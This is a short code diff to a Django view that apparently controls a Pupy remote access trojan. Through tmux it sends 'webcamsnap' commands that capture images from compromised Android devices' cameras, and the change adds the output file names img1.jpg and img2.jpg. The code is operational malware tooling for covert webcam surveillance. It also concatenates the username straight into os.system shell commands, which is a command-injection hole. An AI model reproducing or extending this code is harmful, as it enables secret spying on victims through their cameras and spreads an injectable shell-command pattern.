@@ -102,7 +102,7 @@ def webcamsnap(request):
     username = request.user.username
     dir = '/root/django/users/'+ str(username)+'/pupy/'
 
-    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 1 -o '+str(dir)+'""\n"')
-    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 2 -o '+str(dir)+'""\n"')
+    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 1 -o '+str(dir)+'img1.jpg""\n"')
+    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 2 -o '+str(dir)+'img2.jpg""\n"')
 
     return redirect('RAT:pupy/android/listen')
